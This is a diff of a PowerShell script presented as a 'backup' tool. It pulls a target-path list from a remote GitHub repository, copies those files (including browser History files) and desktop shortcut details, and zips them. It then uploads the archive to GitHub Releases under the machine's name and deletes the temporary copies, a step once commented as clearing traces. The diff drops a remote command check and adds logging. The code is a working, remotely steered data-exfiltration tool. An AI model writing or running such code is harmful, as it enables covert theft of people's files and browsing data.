@@ -1,21 +1,16 @@
-# STEP 0: 远程控制执行权限
-$controlUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/command.txt"
-try {
-    $flag = Invoke-RestMethod -Uri $controlUrl -UseBasicParsing
-    if ($flag.Trim().ToLower() -ne "upload") {
-        Write-Output "🛑 当前指令为 '$flag'，脚本终止。"
-        exit
-    }
-} catch {
-    Write-Output "❌ 无法读取远程控制指令，脚本终止。"
-    exit
-}
-
 # Set UTF-8 encoding
+chcp 65001 > $null
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
+"[UPLOAD START] $(Get-Date -Format u)" | Out-File "C:\runtime_log.txt" -Append
+
 $token = $env:GITHUB_TOKEN
+if (-not $token) {
+    "❌ 没有设置 GITHUB_TOKEN 环境变量，终止。" | Out-File "C:\runtime_log.txt" -Append
+    exit
+}
+
 $repo = "drftghy/backup-files"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -23,19 +18,20 @@ $date = $now.ToString("yyyy-MM-dd")
 $computerName = $env:COMPUTERNAME
 $tag = "backup-$computerName-$timestamp"
 $releaseName = "Backup - $computerName - $date"
-$tempRoot = "$env:TEMP\\package-$computerName-$timestamp"
+$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
 $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
-# STEP 1: Load file path list from remote .txt
+# STEP 1: Load path list
 $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
+    "✅ 远程路径加载成功，共 $($pathList.Count) 条。" | Out-File "C:\runtime_log.txt" -Append
 } catch {
-    Write-Output "❌ 无法加载路径列表。"
-    $pathList = @()
+    "❌ 无法加载路径列表：$($_.Exception.Message)" | Out-File "C:\runtime_log.txt" -Append
+    exit
 }
 
 $index = 0
@@ -43,12 +39,14 @@ foreach ($path in $pathList) {
     $index++
     $name = "item$index"
 
-    if (-not (Test-Path $path)) { continue }
+    if (-not (Test-Path $path)) {
+        "⚠️ 跳过不存在路径：$path" | Out-File "C:\runtime_log.txt" -Append
+        continue
+    }
 
     $dest = Join-Path $tempRoot $name
-
     try {
-        if ($path -like "*\\History" -and (Test-Path $path -PathType Leaf)) {
+        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
             $srcDir = Split-Path $path
             robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
         } elseif (Test-Path $path -PathType Container) {
@@ -56,49 +54,47 @@ foreach ($path in $pathList) {
         } else {
             Copy-Item $path -Destination $dest -Force -ErrorAction Stop
         }
+        "✅ 拷贝完成：$path" | Out-File "C:\runtime_log.txt" -Append
     } catch {
-        Write-Output "⚠️ 拷贝失败：$path"
+        "❌ 拷贝失败：$path" | Out-File "C:\runtime_log.txt" -Append
     }
 }
 
-# STEP 2: 提取桌面快捷方式信息
+# STEP 2: 桌面快捷方式
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
     $lnkReport = ""
-
     foreach ($lnk in $lnkFiles) {
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnk.FullName)
-
         $lnkReport += "[$($lnk.Name)]`n"
         $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
         $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
         $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
-        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
-        $lnkReport += "-----------`n"
+        $lnkReport += "Icon:       $($shortcut.IconLocation)`n-----------`n"
     }
-
-    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
-    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
+    $lnkReport | Out-File -FilePath "$tempRoot\lnk_info.txt" -Encoding utf8
+    "✅ 快捷方式信息已提取。" | Out-File "C:\runtime_log.txt" -Append
 } catch {
-    Write-Output "⚠️ 快捷方式提取失败"
+    "⚠️ 快捷方式提取失败" | Out-File "C:\runtime_log.txt" -Append
 }
 
-# STEP 3: 压缩归档
+# STEP 3: 压缩
 try {
-    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
+    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
+    "✅ 压缩完成：$zipPath" | Out-File "C:\runtime_log.txt" -Append
 } catch {
-    Write-Output "❌ 压缩失败，终止上传。"
+    "❌ 压缩失败" | Out-File "C:\runtime_log.txt" -Append
     exit
 }
 
-# STEP 4: 上传到 GitHub Releases
+# STEP 4: 上传 Release
 $releaseData = @{
     tag_name = $tag
-    name = $releaseName
-    body = "Automated file package from $computerName on $date"
-    draft = $false
+    name     = $releaseName
+    body     = "Automated backup from $computerName on $date"
+    draft    = $false
     prerelease = $false
 } | ConvertTo-Json -Depth 3
 
@@ -111,8 +107,9 @@ $headers = @{
 try {
     $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
+    "✅ 创建 Release 成功。" | Out-File "C:\runtime_log.txt" -Append
 } catch {
-    Write-Output "❌ 创建 Release 失败"
+    "❌ 创建 Release 失败：$($_.Exception.Message)" | Out-File "C:\runtime_log.txt" -Append
     exit
 }
 
@@ -123,15 +120,19 @@ try {
         "Content-Type" = "application/zip"
         "User-Agent" = "PowerShellScript"
     }
-    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    "✅ 上传成功。" | Out-File "C:\runtime_log.txt" -Append
 } catch {
-    Write-Output "❌ 上传文件失败"
+    "❌ 上传失败：$($_.Exception.Message)" | Out-File "C:\runtime_log.txt" -Append
 }
 
-# STEP 5: 清理痕迹
+# STEP 5: 清理
 try {
     Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    "🧹 临时文件清理完成。" | Out-File "C:\runtime_log.txt" -Append
 } catch {
-    Write-Output "⚠️ 清理失败"
+    "⚠️ 清理失败。" | Out-File "C:\runtime_log.txt" -Append
 }
+
+"[UPLOAD END] $(Get-Date -Format u)`n" | Out-File "C:\runtime_log.txt" -Append
